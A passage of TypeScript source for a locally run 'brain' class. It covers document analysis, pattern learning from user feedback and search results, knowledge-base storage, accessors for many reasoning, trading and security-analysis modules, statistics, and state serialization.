  async analyzeDocument(request: DocumentAnalysisInput): Promise<DocumentAnalysisOutput> {
    this.stats.lastUsedAt = new Date().toISOString()

    if (!request.content || request.content.trim().length === 0) {
      throw new Error('Document content is empty')
    }

    // Use deep DocumentAnalyzer if available (Phase 11)
    if (this.documentAnalyzer) {
      const result = this.documentAnalyzer.analyze({
        content: request.content,
        fileName: request.fileName,
        mimeType: request.mimeType,
        question: request.question,
      })

      return {
        description: result.description,
        wordCount: result.metadata.wordCount,
        estimatedPages: result.metadata.estimatedPages,
        keywords: result.keywords.map(k => k.word),
        readabilityLevel: result.readability.level.replace(/_/g, ' '),
        documentType: result.classification.primaryType.replace(/_/g, ' '),
        sentiment: result.sentiment.overall,
        sections: result.structure.sections.map(s => ({
          title: s.title,
          wordCount: s.wordCount,
        })),
        answer: result.answer,
        confidence: result.confidence,
        processingMs: result.processingMs,
      }
    }

    // Fallback: basic analysis
    const words = request.content.split(/\s+/).filter(Boolean)
    return {
      description: `Document analysis: ${words.length} words.`,
      wordCount: words.length,
      estimatedPages: Math.max(1, Math.ceil(words.length / 250)),
      keywords: [],
      readabilityLevel: 'unknown',
      documentType: 'general',
      sentiment: 'neutral',
      sections: [{ title: 'Content', wordCount: words.length }],
      answer: null,
      confidence: 0.3,
      processingMs: 0,
    }
  }

  /**
   * Deep document analysis returning the full DocumentAnalysisResult.
   * Provides readability metrics, classification, section summaries, tables, code blocks, etc.
   */
  analyzeDocumentDeep(content: string, fileName?: string, mimeType?: string, question?: string) {
    if (!this.documentAnalyzer) {
      throw new Error('DocumentAnalyzer not available — enable intelligence modules')
    }
    return this.documentAnalyzer.analyze({ content, fileName, mimeType, question })
  }

  // ── Self-Learning ──

  /**
   * Teach the brain something new. It will remember this for future conversations.
   * This is the core self-learning capability.
   */
  learn(input: string, correctResponse: string, category = 'learned'): void {
    if (!this.config.learningEnabled) return

    const keywords = extractKeywords(input)

    // Map category to priority
    const priority = this.categoryToPriority(category)

    // Check if we already have a similar pattern
    const existing = this.learnedPatterns.find(p =>
      p.keywords.length > 0 && keywords.length > 0 &&
      p.keywords.some(k => keywords.includes(k)) &&
      p.inputPattern.toLowerCase() === input.toLowerCase()
    )

    if (existing) {
      // Reinforce existing pattern
      existing.reinforcements++
      existing.response = correctResponse
      existing.confidence = Math.min(1, existing.confidence + 0.1)
      existing.lastUsed = new Date().toISOString()
      // Upgrade priority if higher
      if ((PRIORITY_WEIGHTS[priority] ?? 1) > (PRIORITY_WEIGHTS[existing.priority] ?? 1)) {
        existing.priority = priority
      }
    } else {
      // Create new pattern
      if (this.learnedPatterns.length >= this.config.maxLearnedPatterns) {
        // Remove least confident pattern to make room
        this.learnedPatterns.sort((a, b) => a.confidence - b.confidence)
        this.learnedPatterns.shift()
      }

      this.learnedPatterns.push({
        inputPattern: input,
        keywords,
        response: correctResponse,
        category,
        reinforcements: 1,
        lastUsed: new Date().toISOString(),
        confidence: 0.5,
        priority,
      })
      this.stats.patternsLearned++
    }

    this.stats.totalLearnings++
    this.learningsSinceLastSave++

    // Auto-save periodically
    if (this.config.autoSavePath &&
        this.learningsSinceLastSave >= this.config.autoSaveInterval) {
      this.autoSave()
    }
  }

  /** Map a category string to a LearnedPatternPriority. */
  private categoryToPriority(category: string): LearnedPatternPriority {
    switch (category) {
      case 'cloud-learned': return 'cloud-learned'
      case 'user-corrected':
      case 'corrected': return 'user-corrected'
      case 'reinforced': return 'reinforced'
      default: return 'learned'
    }
  }

  /**
   * Learn from search results — extract top results and store them as patterns
   * and knowledge entries so the brain gets smarter over time from searching.
   *
   * For each high-confidence result:
   *  1. Learn a pattern mapping the query → result content (for future recall)
   *  2. Add the result as a knowledge entry (for knowledge base search)
   *  3. Re-index the new knowledge into the search engine's document index
   *  4. Grow the semantic memory graph with discovered concepts and relations
   */
  private learnFromSearchResults(
    query: string,
    searchResult: SearchWithThinkingResult,
  ): void {
    if (!this.config.learningEnabled) return
    if (searchResult.results.length === 0) return

    const learnedIds: string[] = []

    // Learn from top results that meet the confidence threshold
    const topResults = searchResult.results.slice(0, 5)
    for (const result of topResults) {
      // Only learn from results with meaningful relevance
      if (result.score < 0.15) continue

      // 1. Learn as a conversational pattern (query → answer)
      const patternInput = query.trim()
      const patternResponse = result.content.slice(0, 500)
      const category = result.matchedBy.length > 2 ? 'reinforced' : 'learned'
      this.learn(patternInput, patternResponse, category)

      // 2. Add as knowledge entry if it's novel (not already in KB)
      const resultKeywords = result.matchedTerms.slice(0, 10)
      const alreadyInKB = this.knowledgeBase.some(entry =>
        entry.id === result.id ||
        (entry.content === result.content && entry.category === (result.domain ?? 'search-learned'))
      )
      if (!alreadyInKB && result.content.length > 20) {
        const entryId = `search-learned-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
        this.knowledgeBase.push({
          id: entryId,
          category: result.domain ?? 'search-learned',
          keywords: resultKeywords,
          content: result.content,
          useCount: 1,
          weight: Math.max(0.5, result.score),
          source: 'learned',
        })
        learnedIds.push(entryId)
        this.stats.knowledgeEntriesAdded++
      }

      // 3. Grow semantic memory graph with discovered concepts
      if (this.semanticMemory && resultKeywords.length >= 2) {
        try {
          for (const term of resultKeywords.slice(0, 5)) {
            if (!term || term.trim().length < 2) continue
            const existing = this.semanticMemory.findConceptByName(term)
            if (!existing) {
              this.semanticMemory.addConcept(term, result.domain ?? 'search-learned')
            }
          }
          // Link the first keyword to subsequent ones as 'related-to'
          const firstConcept = this.semanticMemory.findConceptByName(resultKeywords[0]!)
          if (firstConcept) {
            for (const term of resultKeywords.slice(1, 4)) {
              const linked = this.semanticMemory.findConceptByName(term)
              if (linked && linked.id !== firstConcept.id) {
                this.semanticMemory.addRelation(
                  firstConcept.id, linked.id, 'related-to',
                  Math.min(1, result.score + 0.2),
                )
              }
            }
          }
        } catch { /* non-critical — don't break learning on graph errors */ }
      }
    }

    // 4. Re-index newly learned knowledge into the search engine so future
    //    searches can find what was previously learned
    if (this.advancedSearchEngine && learnedIds.length > 0) {
      const newDocs = learnedIds
        .map(id => this.knowledgeBase.find(e => e.id === id))
        .filter((e): e is KnowledgeEntry => e != null)
        .map(entry => ({
          id: entry.id,
          title: entry.category,
          content: entry.content,
          keywords: entry.keywords,
          domain: entry.category,
          weight: entry.weight,
        }))
      if (newDocs.length > 0) {
        this.advancedSearchEngine.indexDocuments(newDocs)
      }
    }

    // Track learning stats
    this.stats.totalLearnings += learnedIds.length
    this.learningsSinceLastSave += learnedIds.length
    if (this.config.autoSavePath &&
        this.learningsSinceLastSave >= this.config.autoSaveInterval) {
      this.autoSave()
    }
  }

  /**
   * Add new knowledge to the brain's knowledge base.
   * The brain will use this knowledge in future conversations.
   */
  addKnowledge(category: string, keywords: string[], content: string): void {
    const entry: KnowledgeEntry = {
      id: `learned-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      category,
      keywords,
      content,
      useCount: 0,
      weight: 1.0,
      source: 'learned',
    }
    this.knowledgeBase.push(entry)
    this.stats.knowledgeEntriesAdded++
  }

  /**
   * Provide feedback on the last response. The brain uses this to learn.
   * Pass `correct: true` to reinforce the response, or `correct: false` with
   * a `correction` string to teach the brain the right answer.
   */
  feedback(correct: boolean, correction?: string): void {
    if (!this.config.learningEnabled) return

    const history = this.conversationHistory
    if (history.length < 2) return

    const lastUser = history[history.length - 2]
    const lastAssistant = history[history.length - 1]

    if (!lastUser || !lastAssistant) return
    if (lastUser.role !== 'user' || lastAssistant.role !== 'assistant') return

    const userInput = typeof lastUser.content === 'string' ? lastUser.content : ''
    const assistantResponse = typeof lastAssistant.content === 'string' ? lastAssistant.content : ''

    if (correct) {
      // Reinforce this pattern
      this.learn(userInput, assistantResponse, 'reinforced')

      // Confidence-based learning: if confidence was low but user says correct,
      // slightly boost confidence of related patterns
      if (this.lastConfidenceAssessment < 0.3) {
        const match = this.learnedPatterns.find(
          p => p.inputPattern.toLowerCase() === userInput.toLowerCase()
        )
        if (match) {
          match.confidence = Math.min(1, match.confidence + 0.05)
        }
      }

      // Record positive outcome in ConfidenceGate for calibration
      if (this.confidenceGate) {
        this.confidenceGate.recordOutcome(this.lastConfidenceAssessment, true, this.lastGateDecision)
      }
    } else if (correction) {
      // Learn the correction with higher priority
      this.learn(userInput, correction, 'user-corrected')

      // Wire AdaptiveLearner.learnFromMistake() — categorize the error
      if (this.adaptiveLearner) {
        try {
          this.adaptiveLearner.learnFromMistake(assistantResponse, correction, userInput)
        } catch { /* non-critical */ }
      }

      // Confidence-based learning: if confidence was high but user corrects,
      // aggressively reduce confidence
      if (this.lastConfidenceAssessment > 0.8) {
        const match = this.learnedPatterns.find(
          p => p.inputPattern.toLowerCase() === userInput.toLowerCase()
        )
        if (match) {
          match.confidence = Math.max(0.1, match.confidence - 0.2)
        }
      }

      // Record negative outcome in ConfidenceGate for calibration
      if (this.confidenceGate) {
        this.confidenceGate.recordOutcome(this.lastConfidenceAssessment, false, this.lastGateDecision)
      }
    }
  }

  /**
   * Multi-turn feedback: provide feedback on a specific turn in conversation history.
   * @param turnIndex Index into conversation history (0 = first message).
   * @param correct Whether the response at that turn was correct.
   * @param correction The correct response (if incorrect).
   */
  feedbackOnTurn(turnIndex: number, correct: boolean, correction?: string): void {
    if (!this.config.learningEnabled) return

    const history = this.conversationHistory
    if (turnIndex < 0 || turnIndex >= history.length - 1) return

    const userMsg = history[turnIndex]
    const assistantMsg = history[turnIndex + 1]

    if (!userMsg || !assistantMsg) return
    if (userMsg.role !== 'user' || assistantMsg.role !== 'assistant') return

    const userInput = typeof userMsg.content === 'string' ? userMsg.content : ''
    const assistantResponse = typeof assistantMsg.content === 'string' ? assistantMsg.content : ''

    if (correct) {
      this.learn(userInput, assistantResponse, 'reinforced')
    } else if (correction) {
      this.learn(userInput, correction, 'user-corrected')
    }
  }

  /**
   * Get patterns that have conflicting responses for similar inputs.
   * Useful for identifying ambiguous patterns for user review.
   */
  getConflicts(): PatternConflict[] {
    const conflicts: PatternConflict[] = []
    const checked = new Set<string>()

    for (const pattern of this.learnedPatterns) {
      if (checked.has(pattern.inputPattern)) continue

      // Find similar patterns using keyword overlap
      const similar = this.learnedPatterns.filter(other =>
        other !== pattern &&
        !checked.has(other.inputPattern) &&
        other.keywords.some(k => pattern.keywords.includes(k)) &&
        other.response !== pattern.response
      )

      if (similar.length > 0) {
        conflicts.push({
          query: pattern.inputPattern,
          patterns: [
            { pattern, score: pattern.confidence },
            ...similar.map(s => ({ pattern: s, score: s.confidence })),
          ],
        })
        checked.add(pattern.inputPattern)
        for (const s of similar) checked.add(s.inputPattern)
      }
    }

    return conflicts
  }

  // ── Knowledge Search ──

  /** Search the brain's knowledge base. */
  searchKnowledge(query: string, limit = 10): KnowledgeSearchResult[] {
    const keywords = extractKeywords(query)
    return searchKnowledge(this.knowledgeBase, keywords, limit)
  }

  // ── Model Info (compatible with AiBrain interface) ──

  getModel(): string { return this.config.model }
  setModel(model: string): void { this.config.model = model }
  clearHistory(): void { this.conversationHistory = [] }

  // ── Brain Stats ──

  getStats(): Readonly<LocalBrainStats> { return { ...this.stats } }
  getLearnedPatternCount(): number { return this.learnedPatterns.length }
  getKnowledgeBaseSize(): number { return this.knowledgeBase.length }

  // ── Intelligence Module Accessors ──

  /** Get the SemanticEngine instance (null if intelligence modules are disabled). */
  getSemanticEngine(): SemanticEngine | null { return this.semanticEngine }

  /** Get the IntentEngine instance (null if intelligence modules are disabled). */
  getIntentEngine(): IntentEngine | null { return this.intentEngine }

  /** Get the ContextManager instance (null if intelligence modules are disabled). */
  getContextManager(): ContextManager | null { return this.contextManager }

  /** Get the ReasoningEngine instance (null if intelligence modules are disabled). */
  getReasoningEngine(): ReasoningEngine | null { return this.reasoningEngine }

  /** Get the MetaCognition instance (null if intelligence modules are disabled). */
  getMetaCognition(): MetaCognition | null { return this.metaCognition }

  /** Get the SemanticMemory instance (null if intelligence modules are disabled). */
  getSemanticMemory(): SemanticMemory | null { return this.semanticMemory }

  /** Get the SemanticTrainer instance (null if intelligence modules are disabled). */
  getSemanticTrainer(): SemanticTrainer | null { return this.semanticTrainer }

  /** Get the AnalogicalReasoner instance (null if intelligence modules are disabled). */
  getAnalogicalReasoner(): AnalogicalReasoner | null { return this.analogicalReasoner }

  /** Get the TopicModeler instance (null if intelligence modules are disabled). */
  getTopicModeler(): TopicModeler | null { return this.topicModeler }

  /** Get the CausalReasoner instance (null if intelligence modules are disabled). */
  getCausalReasoner(): CausalReasoner | null { return this.causalReasoner }

  /** Get the AbstractionEngine instance (null if intelligence modules are disabled). */
  getAbstractionEngine(): AbstractionEngine | null { return this.abstractionEngine }

  /** Get the PlanningEngine instance (null if intelligence modules are disabled). */
  getPlanningEngine(): PlanningEngine | null { return this.planningEngine }

  /** Get the CreativeEngine instance (null if intelligence modules are disabled). */
  getCreativeEngine(): CreativeEngine | null { return this.creativeEngine }

  /** Get the TradingEngine instance (null if intelligence modules are disabled). */
  getTradingEngine(): TradingEngine | null { return this.tradingEngine }

  /** Get the MarketAnalyzer instance (null if intelligence modules are disabled). */
  getMarketAnalyzer(): MarketAnalyzer | null { return this.marketAnalyzer }

  /** Get the PortfolioOptimizer instance (null if intelligence modules are disabled). */
  getPortfolioOptimizer(): PortfolioOptimizer | null { return this.portfolioOptimizer }

  /** Get the StrategyEngine instance (null if intelligence modules are disabled). */
  getStrategyEngine(): StrategyEngine | null { return this.strategyEngine }

  /** Get the DecisionEngine instance (null if intelligence modules are disabled). */
  getDecisionEngine(): DecisionEngine | null { return this.decisionEngine }

  /** Get the KnowledgeSynthesizer instance (null if intelligence modules are disabled). */
  getKnowledgeSynthesizer(): KnowledgeSynthesizer | null { return this.knowledgeSynthesizer }

  /** Get the EconomicAnalyzer instance (null if intelligence modules are disabled). */
  getEconomicAnalyzer(): EconomicAnalyzer | null { return this.economicAnalyzer }

  /** Get the SecurityTrainer instance (null if intelligence modules are disabled). */
  getSecurityTrainer(): SecurityTrainer | null { return this.securityTrainer }

  /** Get the EmotionEngine instance (null if intelligence modules are disabled). */
  getEmotionEngine(): EmotionEngine | null { return this.emotionEngine }

  /** Get the TemporalReasoner instance (null if intelligence modules are disabled). */
  getTemporalReasoner(): TemporalReasoner | null { return this.temporalReasoner }

  /** Get the NormalizationEngine instance (null if intelligence modules are disabled). */
  getNormalizationEngine(): NormalizationEngine | null { return this.normalizationEngine }

  /** Get the BayesianNetwork instance (null if intelligence modules are disabled). */
  getBayesianNetwork(): BayesianNetwork | null { return this.bayesianNetwork }

  /** Get the OntologyManager instance (null if intelligence modules are disabled). */
  getOntologyManager(): OntologyManager | null { return this.ontologyManager }

  /** Get the DialogueManager instance (null if intelligence modules are disabled). */
  getDialogueManager(): DialogueManager | null { return this.dialogueManager }

  /** Get the ArgumentAnalyzer instance (null if intelligence modules are disabled). */
  getArgumentAnalyzer(): ArgumentAnalyzer | null { return this.argumentAnalyzer }

  /** Get the NarrativeEngine instance (null if intelligence modules are disabled). */
  getNarrativeEngine(): NarrativeEngine | null { return this.narrativeEngine }

  /** Get the VulnerabilityScanner instance (null if intelligence modules are disabled). */
  getVulnerabilityScanner(): VulnerabilityScanner | null { return this.vulnerabilityScanner }

  /** Get the ThreatModeler instance (null if intelligence modules are disabled). */
  getThreatModeler(): ThreatModeler | null { return this.threatModeler }

  /** Get the ExploitAnalyzer instance (null if intelligence modules are disabled). */
  getExploitAnalyzer(): ExploitAnalyzer | null { return this.exploitAnalyzer }

  /** Get the NetworkForensics instance (null if intelligence modules are disabled). */
  getNetworkForensics(): NetworkForensics | null { return this.networkForensics }

  /** Get the PatternRecognizer instance (null if intelligence modules are disabled). */
  getPatternRecognizer(): PatternRecognizer | null { return this.patternRecognizer }

  /** Get the ConceptMapper instance (null if intelligence modules are disabled). */
  getConceptMapper(): ConceptMapper | null { return this.conceptMapper }

  /** Get the InferenceEngine instance (null if intelligence modules are disabled). */
  getInferenceEngine(): InferenceEngine | null { return this.inferenceEngine }

  /** Get the SentimentAnalyzer instance (null if intelligence modules are disabled). */
  getSentimentAnalyzer(): SentimentAnalyzer | null { return this.sentimentAnalyzer }

  /** Get the DeepUnderstandingEngine instance (null if intelligence modules are disabled). */
  getDeepUnderstanding(): DeepUnderstandingEngine | null { return this.deepUnderstanding }

  /** Get the TaskOrchestrator instance (null if intelligence modules are disabled). */
  getTaskOrchestrator(): TaskOrchestrator | null { return this.taskOrchestrator }

  /** Get the KnowledgeReasoner instance (null if intelligence modules are disabled). */
  getKnowledgeReasoner(): KnowledgeReasoner | null { return this.knowledgeReasoner }

  /** Get the AdaptiveLearner instance (null if intelligence modules are disabled). */
  getAdaptiveLearner(): AdaptiveLearner | null { return this.adaptiveLearner }

  /** Get the SemanticCodeAnalyzer instance (null if intelligence modules are disabled). */
  getSemanticCodeAnalyzer(): SemanticCodeAnalyzer | null { return this.semanticCodeAnalyzer }

  /** Get the IntelligentRefactorer instance (null if intelligence modules are disabled). */
  getIntelligentRefactorer(): IntelligentRefactorer | null { return this.intelligentRefactorer }

  /** Get the CodeIntentPredictor instance (null if intelligence modules are disabled). */
  getCodeIntentPredictor(): CodeIntentPredictor | null { return this.codeIntentPredictor }

  /** Get the SemanticBridge instance (null if intelligence modules are disabled). */
  getSemanticBridge(): SemanticBridge | null { return this.semanticBridge }

  /** Get the MultiModalFusion instance (null if intelligence modules are disabled). */
  getMultiModalFusion(): MultiModalFusion | null { return this.multiModalFusion }

  /** Get the CurriculumOptimizer instance (null if intelligence modules are disabled). */
  getCurriculumOptimizer(): CurriculumOptimizer | null { return this.curriculumOptimizer }

  /** Get the ImageAnalyzer instance (null if intelligence modules are disabled). */
  getImageAnalyzer(): ImageAnalyzer | null { return this.imageAnalyzer }

  /** Get the DocumentAnalyzer instance (null if intelligence modules are disabled). */
  getDocumentAnalyzer(): DocumentAnalyzer | null { return this.documentAnalyzer }

  /** Get the PdfExpert instance (null if intelligence modules are disabled). */
  getPdfExpert(): PdfExpert | null { return this.pdfExpert }

  /** Get the AdvancedSearchEngine instance (null if intelligence modules are disabled). */
  getAdvancedSearchEngine(): AdvancedSearchEngine | null { return this.advancedSearchEngine }

  /**
   * Perform an advanced multi-strategy search with transparent thinking steps.
   * Combines keyword, fuzzy, synonym, semantic, graph, decomposition, contextual,
   * and cross-domain search strategies. Returns a fully explained result set with
   * chain-of-thought reasoning.
   *
   * The brain also learns from search results — top results are stored as patterns
   * and knowledge entries so future queries benefit from previous searches.
   */
  async searchWithThinking(query: string): Promise<SearchWithThinkingResult | null> {
    if (!this.advancedSearchEngine) return null
    const result = this.advancedSearchEngine.searchWithThinking(query)
    // Learn from search results so the brain gets smarter over time
    this.learnFromSearchResults(query, result)
    return result
  }

  /** Check if intelligence modules are enabled. */
  isIntelligenceEnabled(): boolean { return this.config.enableIntelligence }

  /** Get a summary of intelligence module state. */
  getIntelligenceStats(): {
    enabled: boolean
    contextTurns: number
    contextTopicCount: number
    knowledgeGaps: number
    calibrationAccuracy: number | null
    semanticMemoryNodes: number
    semanticMemoryEdges: number
    trainerVocabularySize: number
    trainerCurrentDomain: string | null
    analogyPatterns: number
    topicModelerTopics: number
    topicModelerDocuments: number
    causalGraphsBuilt: number
    causalInferences: number
    abstractionConcepts: number
    abstractionDepth: number
    plansCreated: number
    avgPlanConfidence: number
    totalBrainstorms: number
    totalIdeasGenerated: number
    tradingAnalyses: number
    tradingSignals: number
    marketSentimentAnalyses: number
    portfolioOptimizations: number
    strategyBacktests: number
    decisionsAnalyzed: number
    knowledgeFusions: number
    economicForecasts: number
    securityTrainingSessions: number
    securityChallengesGenerated: number
    emotionAnalyses: number
    temporalEvents: number
    normalizationRuns: number
    bayesianInferences: number
    ontologyConcepts: number
    dialogueTurns: number
    argumentsAnalyzed: number
    narrativesAnalyzed: number
    totalFusions: number
    totalSkillsTracked: number
  } {
    if (!this.config.enableIntelligence) {
      return {
        enabled: false, contextTurns: 0, contextTopicCount: 0, knowledgeGaps: 0, calibrationAccuracy: null,
        semanticMemoryNodes: 0, semanticMemoryEdges: 0, trainerVocabularySize: 0, trainerCurrentDomain: null,
        analogyPatterns: 0, topicModelerTopics: 0, topicModelerDocuments: 0,
        causalGraphsBuilt: 0, causalInferences: 0, abstractionConcepts: 0, abstractionDepth: 0,
        plansCreated: 0, avgPlanConfidence: 0, totalBrainstorms: 0, totalIdeasGenerated: 0,
        tradingAnalyses: 0, tradingSignals: 0, marketSentimentAnalyses: 0,
        portfolioOptimizations: 0, strategyBacktests: 0, decisionsAnalyzed: 0,
        knowledgeFusions: 0, economicForecasts: 0, securityTrainingSessions: 0, securityChallengesGenerated: 0,
        emotionAnalyses: 0, temporalEvents: 0, normalizationRuns: 0, bayesianInferences: 0,
        ontologyConcepts: 0, dialogueTurns: 0, argumentsAnalyzed: 0, narrativesAnalyzed: 0,
        totalFusions: 0, totalSkillsTracked: 0,
      }
    }

    const contextStats = this.contextManager?.getStats() ?? null
    const metaStats = this.metaCognition?.getStats() ?? null
    const memoryStats = this.semanticMemory?.getStats() ?? null
    const trainerStats = this.semanticTrainer?.getStats() ?? null
    const analogyStats = this.analogicalReasoner?.getStats() ?? null
    const topicStats = this.topicModeler?.getStats() ?? null
    const causalStats = this.causalReasoner?.getStats() ?? null
    const abstractionStats = this.abstractionEngine?.getStats() ?? null
    const planningStats = this.planningEngine?.getStats() ?? null
    const creativeStats = this.creativeEngine?.getStats() ?? null
    const tradingStats = this.tradingEngine?.getStats() ?? null
    const marketStats = this.marketAnalyzer?.getStats() ?? null
    const portfolioStats = this.portfolioOptimizer?.getStats() ?? null
    const strategyStats = this.strategyEngine?.getStats() ?? null
    const decisionStats = this.decisionEngine?.getStats() ?? null
    const synthesizerStats = this.knowledgeSynthesizer?.getStats() ?? null
    const economicStats = this.economicAnalyzer?.getStats() ?? null
    const securityStats = this.securityTrainer?.getStats() ?? null
    const emotionStats = this.emotionEngine?.getStats() ?? null
    const temporalStats = this.temporalReasoner?.getStats() ?? null
    const normalizationStats = this.normalizationEngine?.getStats() ?? null
    const bayesianStats = this.bayesianNetwork?.getStats() ?? null
    const ontologyStats = this.ontologyManager?.getStats() ?? null
    const dialogueStats = this.dialogueManager?.getStats() ?? null
    const argumentStats = this.argumentAnalyzer?.getStats() ?? null
    const narrativeStats = this.narrativeEngine?.getStats() ?? null
    const fusionStats = this.multiModalFusion?.getStats() ?? null
    const curriculumStats = this.curriculumOptimizer?.getStats() ?? null

    return {
      enabled: true,
      contextTurns: contextStats?.totalTurns ?? 0,
      contextTopicCount: contextStats?.uniqueTopics ?? 0,
      knowledgeGaps: metaStats?.knownGaps ?? 0,
      calibrationAccuracy: metaStats?.calibrationAccuracy ?? null,
      semanticMemoryNodes: memoryStats?.nodeCount ?? 0,
      semanticMemoryEdges: memoryStats?.edgeCount ?? 0,
      trainerVocabularySize: trainerStats?.totalExamples ?? 0,
      trainerCurrentDomain: trainerStats?.currentDomain ?? null,
      analogyPatterns: analogyStats?.patternsLearned ?? 0,
      topicModelerTopics: topicStats?.totalTopics ?? 0,
      topicModelerDocuments: topicStats?.totalDocuments ?? 0,
      causalGraphsBuilt: causalStats?.totalGraphsBuilt ?? 0,
      causalInferences: causalStats?.totalInferences ?? 0,
      abstractionConcepts: abstractionStats?.conceptCount ?? 0,
      abstractionDepth: abstractionStats?.hierarchyDepth ?? 0,
      plansCreated: planningStats?.totalPlansCreated ?? 0,
      avgPlanConfidence: planningStats?.avgConfidence ?? 0,
      totalBrainstorms: creativeStats?.totalBrainstorms ?? 0,
      totalIdeasGenerated: creativeStats?.totalIdeasGenerated ?? 0,
      tradingAnalyses: tradingStats?.totalAnalyses ?? 0,
      tradingSignals: tradingStats?.totalSignals ?? 0,
      marketSentimentAnalyses: marketStats?.totalSentimentAnalyses ?? 0,
      portfolioOptimizations: portfolioStats?.totalOptimizations ?? 0,
      strategyBacktests: strategyStats?.totalBacktests ?? 0,
      decisionsAnalyzed: decisionStats?.totalDecisions ?? 0,
      knowledgeFusions: synthesizerStats?.totalFusions ?? 0,
      economicForecasts: economicStats?.totalForecasts ?? 0,
      securityTrainingSessions: securityStats?.totalTrainingSessions ?? 0,
      securityChallengesGenerated: securityStats?.totalChallengesGenerated ?? 0,
      emotionAnalyses: emotionStats?.totalAnalyses ?? 0,
      temporalEvents: temporalStats?.totalEvents ?? 0,
      normalizationRuns: normalizationStats?.totalNormalizations ?? 0,
      bayesianInferences: bayesianStats?.nodeCount ?? 0,
      ontologyConcepts: ontologyStats?.totalConcepts ?? 0,
      dialogueTurns: dialogueStats?.totalTurns ?? 0,
      argumentsAnalyzed: argumentStats?.totalArguments ?? 0,
      narrativesAnalyzed: narrativeStats?.totalBeats ?? 0,
      totalFusions: fusionStats?.totalFusions ?? 0,
      totalSkillsTracked: curriculumStats?.totalSkills ?? 0,
    }
  }

  // ── Persistence ──

  /** Serialize the entire brain state for storage. */
  serializeBrain(): string {
    const state: LocalBrainState = {
      config: this.config,
      learnedPatterns: this.learnedPatterns,
      conversationHistory: this.conversationHistory,
      knowledgeAdditions: this.knowledgeBase.filter(e => e.source === 'learned'),
      stats: this.stats,
    }

    // Serialize advanced intelligence module states
    const advancedState: Record<string, string> = {}
    if (this.semanticMemory) advancedState.semanticMemory = this.semanticMemory.serialize()
    if (this.semanticTrainer) advancedState.semanticTrainer = this.semanticTrainer.serialize()
    if (this.analogicalReasoner) advancedState.analogicalReasoner = this.analogicalReasoner.serialize()
    if (this.topicModeler) advancedState.topicModeler = this.topicModeler.serialize()
    if (this.causalReasoner) advancedState.causalReasoner = this.causalReasoner.serialize()
    if (this.abstractionEngine) advancedState.abstractionEngine = this.abstractionEngine.serialize()
    if (this.planningEngine) advancedState.planningEngine = this.planningEngine.serialize()
    if (this.creativeEngine) advancedState.creativeEngine = this.creativeEngine.serialize()
    if (this.tradingEngine) advancedState.tradingEngine = this.tradingEngine.serialize()
    if (this.marketAnalyzer) advancedState.marketAnalyzer = this.marketAnalyzer.serialize()
    if (this.portfolioOptimizer) advancedState.portfolioOptimizer = this.portfolioOptimizer.serialize()
    if (this.strategyEngine) advancedState.strategyEngine = this.strategyEngine.serialize()
    if (this.decisionEngine) advancedState.decisionEngine = this.decisionEngine.serialize()
    if (this.knowledgeSynthesizer) advancedState.knowledgeSynthesizer = this.knowledgeSynthesizer.serialize()
    if (this.economicAnalyzer) advancedState.economicAnalyzer = this.economicAnalyzer.serialize()
    if (this.securityTrainer) advancedState.securityTrainer = this.securityTrainer.serialize()
    if (this.temporalReasoner) advancedState.temporalReasoner = this.temporalReasoner.serialize()
    if (this.normalizationEngine) advancedState.normalizationEngine = this.normalizationEngine.serialize()
    if (this.bayesianNetwork) advancedState.bayesianNetwork = this.bayesianNetwork.serialize()
    if (this.ontologyManager) advancedState.ontologyManager = this.ontologyManager.serialize()
    if (this.dialogueManager) advancedState.dialogueManager = this.dialogueManager.serialize()
    if (this.argumentAnalyzer) advancedState.argumentAnalyzer = this.argumentAnalyzer.serialize()
    if (this.narrativeEngine) advancedState.narrativeEngine = this.narrativeEngine.serialize()
    if (this.vulnerabilityScanner) advancedState.vulnerabilityScanner = this.vulnerabilityScanner.serialize()
    if (this.threatModeler) advancedState.threatModeler = this.threatModeler.serialize()
    if (this.exploitAnalyzer) advancedState.exploitAnalyzer = this.exploitAnalyzer.serialize()
    if (this.networkForensics) advancedState.networkForensics = this.networkForensics.serialize()
    if (this.patternRecognizer) advancedState.patternRecognizer = this.patternRecognizer.serialize()
    if (this.conceptMapper) advancedState.conceptMapper = this.conceptMapper.serialize()
    if (this.inferenceEngine) advancedState.inferenceEngine = this.inferenceEngine.serialize()
    if (this.sentimentAnalyzer) advancedState.sentimentAnalyzer = this.sentimentAnalyzer.serialize()

    return JSON.stringify({ ...state, advancedIntelligence: advancedState })
  }

  /** Restore brain state from a serialized string. */
  static deserializeBrain(json: string): LocalBrain {
    const state = JSON.parse(json) as LocalBrainState
    const brain = new LocalBrain({ ...state.config, autoSavePath: '' })  // Prevent double-load
    brain.learnedPatterns = state.learnedPatterns.map(p => ({
      ...p,
      priority: p.priority ?? 'learned',  // Migrate old patterns without priority
    }))
    brain.conversationHistory = state.conversationHistory
    brain.stats = state.stats
    brain.config = { ...brain.config, ...state.config }

    // Restore learned knowledge entries
    for (const entry of state.knowledgeAdditions) {
      brain.knowledgeBase.push(entry)
    }

    // Restore advanced intelligence module states if present
    const parsed = JSON.parse(json) as Record<string, unknown>
    const advanced = parsed.advancedIntelligence as Record<string, string> | undefined
    if (advanced && brain.config.enableIntelligence) {
      if (advanced.semanticMemory) {
        try { brain.semanticMemory = SemanticMemory.deserialize(advanced.semanticMemory) } catch { /* ignore corrupted state */ }
      }
      if (advanced.semanticTrainer) {
        try { brain.semanticTrainer = SemanticTrainer.deserialize(advanced.semanticTrainer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.analogicalReasoner) {
        try { brain.analogicalReasoner = AnalogicalReasoner.deserialize(advanced.analogicalReasoner) } catch { /* ignore corrupted state */ }
      }
      if (advanced.topicModeler) {
        try { brain.topicModeler = TopicModeler.deserialize(advanced.topicModeler) } catch { /* ignore corrupted state */ }
      }
      if (advanced.causalReasoner) {
        try { brain.causalReasoner = CausalReasoner.deserialize(advanced.causalReasoner) } catch { /* ignore corrupted state */ }
      }
      if (advanced.abstractionEngine) {
        try { brain.abstractionEngine = AbstractionEngine.deserialize(advanced.abstractionEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.planningEngine) {
        try { brain.planningEngine = PlanningEngine.deserialize(advanced.planningEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.creativeEngine) {
        try { brain.creativeEngine = CreativeEngine.deserialize(advanced.creativeEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.tradingEngine) {
